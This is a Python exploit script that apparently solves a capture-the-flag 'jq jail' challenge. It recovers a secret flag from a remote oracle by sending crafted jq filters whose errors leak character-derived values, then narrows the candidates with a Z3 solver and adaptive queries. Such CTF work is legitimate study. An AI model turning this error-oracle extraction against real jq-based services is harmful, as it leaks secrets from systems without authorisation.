#!/usr/bin/env python3
from __future__ import annotations
import argparse, json, sys, time, subprocess, importlib.util
from pathlib import Path
from dataclasses import dataclass
from typing import Sequence


def load_base():
    p=Path(__file__).resolve().parent/'solve_checked.py'
    spec=importlib.util.spec_from_file_location('base_solve', str(p))
    mod=importlib.util.module_from_spec(spec)
    sys.modules['base_solve']=mod
    spec.loader.exec_module(mod) # type: ignore
    return mod

base=load_base()

class ParallelRemoteOracle:
    def __init__(self, host, port, timeout=240, conns=2):
        from concurrent.futures import ThreadPoolExecutor
        self.pool = ThreadPoolExecutor(max_workers=conns)
        self.oracles = []
        last = None
        for i in range(conns):
            for attempt in range(1,6):
                try:
                    self.oracles.append(base.RemoteOracle(host, port, timeout))
                    break
                except Exception as e:
                    last = e
                    print(f'[!] connection {i+1} attempt {attempt}/5 failed: {type(e).__name__}: {e}', flush=True)
                    time.sleep(min(2*attempt, 8))
            else:
                raise last
        print(f'[+] parallel remote connections: {len(self.oracles)}', flush=True)
    def query_batch(self, expressions):
        if not expressions: return []
        if len(expressions) == 1:
            return self.oracles[0].query_batch(expressions)
        chunks=[[] for _ in self.oracles]
        idxs=[[] for _ in self.oracles]
        for i,e in enumerate(expressions):
            j=i % len(self.oracles)
            chunks[j].append(e); idxs[j].append(i)
        futs=[self.pool.submit(o.query_batch, ch) for o,ch in zip(self.oracles,chunks)]
        out=[None]*len(expressions)
        for fut, ids in zip(futs, idxs):
            ans=fut.result()
            for k,a in zip(ids, ans): out[k]=a
        return out
    def close(self):
        for o in self.oracles:
            try: o.close()
            except Exception: pass
        self.pool.shutdown(wait=False)

@dataclass(frozen=True)
class Obs:
    fi:int; reverse:bool; value:int; present:bool

def predicate(ops):
    parts=[]
    for op in ops:
        parts.append(op); parts.append('normals')
    return '|'.join(parts)

def jq_accept_set(jq_cmd, values, ops):
    pred=predicate(ops)
    values_json=json.dumps(sorted(values), separators=(',',':'))
    expr=f'{values_json}[] as $v | try ($v|{pred}|$v) catch empty'
    r=subprocess.run([jq_cmd,'-n','-c',f'[{expr}]'], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
    if r.returncode not in (0,4):
        raise RuntimeError(f'jq calibration failed rc={r.returncode}: {r.stderr[-300:]} ops={ops}')
    return set(map(int,json.loads(r.stdout.strip() or '[]')))

def extend_raw_features():
    if any(getattr(f, 'name', '').startswith('raw_impl_j') for f in base.FEATURES):
        return
    def nested_json(value, nesting:int):
        for _ in range(nesting):
            value=json.dumps(value, ensure_ascii=False, separators=(',',':'))
        return value
    for nesting in range(0,9):
        prefix='flatten|implode|' + ('tojson|'*nesting)
        def encoded(i,c,nesting=nesting):
            vals=[i] if c is None else [i,c]
            value=''.join(chr(v) for v in vals)
            return nested_json(value,nesting)
        def raw_add(i,c,encoded=encoded):
            return sum(map(ord, encoded(i,c)))
        def raw_unique(i,c,encoded=encoded):
            return sum(set(map(ord, encoded(i,c))))
        base.FEATURES.append(base.Feature(f'raw_impl_j{nesting}_add', prefix+'explode|add', raw_add))
        base.FEATURES.append(base.Feature(f'raw_impl_j{nesting}_uniq', prefix+'explode|unique|add', raw_unique))
    print(f'[+] extended features to {len(base.FEATURES)}', flush=True)


def fixed_domain(pos,length,charset):
    if pos < 5: return [ord('jail{'[pos])]
    if pos == length-1: return [ord('}')]
    return list(map(ord, charset))

def build_universe(length, charset, feature_count):
    domains={i:fixed_domain(i,length,charset) for i in range(length)}
    vals=set()
    for fi in range(feature_count):
        f=base.FEATURES[fi]
        for rev in (False, True):
            vals.add(f.evaluate(length-1,None))
            for pos, chars in domains.items():
                idx=length-1-pos if rev else pos
                for c in chars: vals.add(f.evaluate(idx,c))
    return vals

def calibrate_exact(chains_path, universe, jq_cmd):
    raw=json.loads(Path(chains_path).read_text())
    best={}
    sizes=[]
    for k,ops in sorted(raw.items(), key=lambda kv:int(kv[0])):
        acc=jq_accept_set(jq_cmd, universe, ops)
        sizes.append(len(acc))
        if len(acc)==1:
            v=next(iter(acc))
            # prefer shorter chain
            if v not in best or len(ops)<len(best[v]): best[v]=ops
    print(f'[+] exact predicates over universe: {len(best)} values; size_hist_sample={ {s:sizes.count(s) for s in sorted(set(sizes))[:8]} }', flush=True)
    return best

def make_queries(length, charset, feature_count, exact):
    domains={i:fixed_domain(i,length,charset) for i in range(length)}
    exprs=[]; meta=[]
    for fi in range(feature_count):
        f=base.FEATURES[fi]
        for rev in (False, True):
            vals={f.evaluate(length-1,None)}
            for pos, chars in domains.items():
                idx=length-1-pos if rev else pos
                vals.update(f.evaluate(idx,c) for c in chars)
            b=base.BASE + ('|explode|reverse|implode' if rev else '')
            for v in sorted(vals & exact.keys()):
                exprs.append(f'{b}|explode|tostream|{f.suffix}|{predicate(exact[v])}|error')
                meta.append((fi,rev,v))
    return exprs, meta

def query_progress(oracle, exprs, batch):
    out=[]; t=time.time(); total=len(exprs)
    for off in range(0,total,batch):
        ans=oracle.query_batch(exprs[off:off+batch])
        out.extend(ans)
        rate=len(out)/(time.time()-t)
        eta=(total-len(out))/rate if rate else 0
        print(f'    progress: {len(out)}/{total} ({100*len(out)/total:5.1f}%) | {rate:.1f} q/s | ETA {eta:.1f}s', flush=True)
    return out

def domains_constraints(length, charset, observations):
    domains={i:fixed_domain(i,length,charset) for i in range(length)}
    constraints=[]
    # negatives first
    for obs in observations:
        if obs.present: continue
        f=base.FEATURES[obs.fi]
        for pos in range(length):
            idx=length-1-pos if obs.reverse else pos
            domains[pos]=[c for c in domains[pos] if f.evaluate(idx,c)!=obs.value]
            if not domains[pos]:
                raise RuntimeError(f'empty domain pos={pos} feature={f.name} rev={obs.reverse} value={obs.value}')
    # positives: if value present, at least one pair has it. Ignore nuisance-only positives.
    for obs in observations:
        if not obs.present: continue
        f=base.FEATURES[obs.fi]
        if f.evaluate(length-1,None)==obs.value: continue
        opts=[]
        for pos, chars in domains.items():
            idx=length-1-pos if obs.reverse else pos
            for c in chars:
                if f.evaluate(idx,c)==obs.value: opts.append((pos,c))
        if opts: constraints.append(frozenset(opts))
    # de-dupe
    constraints=sorted(set(constraints), key=lambda x:(len(x), sorted(x)))
    return domains, constraints

def solve_z3(length, domains, constraints, limit):
    import z3
    xs=[z3.Int(f'c{i}') for i in range(length)]
    s=z3.Solver()
    for i,cs in domains.items(): s.add(z3.Or([xs[i]==c for c in cs]))
    for con in constraints: s.add(z3.Or([xs[i]==c for i,c in con]))
    sol=[]
    while len(sol)<limit and s.check()==z3.sat:
        m=s.model(); vals=[m.eval(xs[i]).as_long() for i in range(length)]
        text=''.join(map(chr,vals)); sol.append(text)
        s.add(z3.Or([xs[i]!=vals[i] for i in range(length)]))
    return sol

def value_set_for_text(text, fi, rev):
    f=base.FEATURES[fi]
    length=len(text)
    vals=set()
    n=f.evaluate(length-1, None)
    if n is not None: vals.add(n)
    for pos,ch in enumerate(text):
        idx=length-1-pos if rev else pos
        v=f.evaluate(idx, ord(ch))
        if v is not None: vals.add(v)
    return vals

def choose_discriminators(a, b, exact, queried, feature_limit, count):
    choices=[]
    for fi in range(feature_limit):
        f=base.FEATURES[fi]
        for rev in (False, True):
            va=value_set_for_text(a,fi,rev)
            vb=value_set_for_text(b,fi,rev)
            # Prefer values that differ between the two current models.
            for v in sorted((va ^ vb) & exact.keys()):
                key=(fi,rev,v)
                if key in queried: continue
                cost=len(exact[v])*10 + f.suffix.count('|')
                choices.append((cost,fi,rev,v))
    choices=sorted(choices)
    out=[]
    used_features=set()
    # First pass: diverse features.
    for _,fi,rev,v in choices:
        if len(out)>=count: break
        fam=(fi,rev)
        if fam in used_features: continue
        out.append((fi,rev,v)); used_features.add(fam); queried.add((fi,rev,v))
    # Second pass: fill remaining.
    for _,fi,rev,v in choices:
        if len(out)>=count: break
        key=(fi,rev,v)
        if key in queried: continue
        out.append(key); queried.add(key)
    return out

def run(args):
    extend_raw_features()
    length=args.length; charset=args.charset
    universe=build_universe(length, charset, args.discriminator_features)
    print(f'[+] length={length} charset={charset!r} broad_features={args.feature_count} discr_features={args.discriminator_features} universe={len(universe)}', flush=True)
    exact=calibrate_exact(args.chains, universe, args.calibrate_jq)
    exprs,meta=make_queries(length, charset, args.feature_count, exact)
    print(f'[*] exact broad phase: {args.feature_count} features, {len(exprs)} oracle queries', flush=True)
    if args.mode=='local':
        oracle=base.LocalServerOracle(Path('server.py'), args.flag, args.calibrate_jq, args.timeout)
    else:
        oracle=ParallelRemoteOracle(args.host,args.port,args.timeout,args.conns)
    answers=query_progress(oracle, exprs, args.batch)
    obs=[Obs(fi,rev,v,a=='error') for (fi,rev,v),a in zip(meta,answers)]
    domains, cons=domains_constraints(length, charset, obs)
    amb={i:''.join(map(chr,cs)) for i,cs in domains.items() if len(cs)>1}
    print(f'[+] domain_size={sum(map(len,domains.values()))} ambiguous_positions={len(amb)} constraints={len(cons)}', flush=True)
    # Print compact amb first 30
    for i,(p,cs) in enumerate(amb.items()):
        if i<60: print(f'[!] amb {p}: {cs}', flush=True)
    queried={(o.fi,o.reverse,o.value) for o in obs}
    for rnd in range(args.adaptive_rounds+1):
        domains, cons=domains_constraints(length, charset, obs)
        amb={i:''.join(map(chr,cs)) for i,cs in domains.items() if len(cs)>1}
        print(f'[+] round={rnd} domain_size={sum(map(len,domains.values()))} ambiguous_positions={len(amb)} constraints={len(cons)}', flush=True)
        sol=solve_z3(length, domains, cons, limit=max(2,args.limit))
        print(f'[+] solutions_count={len(sol)}', flush=True)
        for x in sol[:min(len(sol),3)]: print('[+] candidate:',x, flush=True)
        if len(sol)==1:
            print('[+] recovered flag:',sol[0], flush=True)
            if args.mode=='local' and sol[0]!=args.flag:
                print('[-] local mismatch expected:',args.flag, flush=True); oracle.close(); return 1
            oracle.close(); return 0
        if len(sol)<2:
            oracle.close(); return 3
        if rnd>=args.adaptive_rounds:
            break
        batch=choose_discriminators(sol[0], sol[1], exact, queried, args.discriminator_features, args.adaptive_batch)
        if not batch:
            print('[-] no discriminator found', flush=True); break
        exprs=[]
        for fi,rev,v in batch:
            f=base.FEATURES[fi]
            b=base.BASE + ('|explode|reverse|implode' if rev else '')
            exprs.append(f'{b}|explode|tostream|{f.suffix}|{predicate(exact[v])}|error')
        ans=oracle.query_batch(exprs)
        present=0
        for (fi,rev,v),a in zip(batch,ans):
            obs.append(Obs(fi,rev,v,a=='error'))
            present += (a=='error')
        print(f'[*] adaptive {rnd+1}: asked={len(batch)} present={present} absent={len(batch)-present}', flush=True)
    oracle.close(); return 2

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('--length',type=int,default=142)
    ap.add_argument('--chains',default='chains_225.json')
    ap.add_argument('--charset',default=base.DEFAULT_CHARSET)
    ap.add_argument('--feature-count',type=int,default=84)
    ap.add_argument('--discriminator-features',type=int,default=124)
    ap.add_argument('--adaptive-rounds',type=int,default=200)
    ap.add_argument('--adaptive-batch',type=int,default=32)
    ap.add_argument('--conns',type=int,default=2)
    ap.add_argument('--batch',type=int,default=128)
    ap.add_argument('--limit',type=int,default=3)
    ap.add_argument('--timeout',type=int,default=240)
    ap.add_argument('--calibrate-jq',default='jq')
    sub=ap.add_subparsers(dest='mode', required=True)
    loc=sub.add_parser('local'); loc.add_argument('--flag',required=True)
    rem=sub.add_parser('remote'); rem.add_argument('host'); rem.add_argument('port',type=int)
    args=ap.parse_args()
    raise SystemExit(run(args))
if __name__=='__main__': main()
